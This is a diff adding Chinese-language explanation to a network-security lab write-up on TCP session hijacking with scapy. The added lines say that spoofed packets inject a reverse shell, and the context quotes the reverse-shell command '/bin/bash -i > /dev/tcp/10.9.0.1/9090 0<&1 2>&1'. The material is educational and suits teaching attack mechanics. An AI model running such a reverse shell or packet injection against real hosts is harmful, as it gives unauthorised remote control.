@@ -256,6 +256,8 @@ pkt = sniff(iface='br-832b8642e575', filter=f, prn=spoof_pkt)
 
 ```
 
+脚本的攻击目标是向目标主机注入恶意命令，并试图将其写入目标主机的文件 `~/hijacking.out` 中
+
 我们先让 $user1$ 连接上 $victim$ :
 
 ![3-1](../image/3-1.png)
@@ -324,6 +326,10 @@ pkt = sniff(iface='br-832b8642e575', filter=f, prn=spoof_pkt)
 # - 捕获到符合条件的数据包后，调用函数 spoof_pkt 对该包进行处理
 
 ```
+
+这段代码通过伪造 TCP 数据包，试图向目标主机注入一个反向 Shell 命令，从而建立一个攻击者控制的连接。
+
+攻击成功后，攻击者可以获得目标主机的 Shell 访问权限，执行任意命令。
 
 关于`/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1` 这条指令：
 
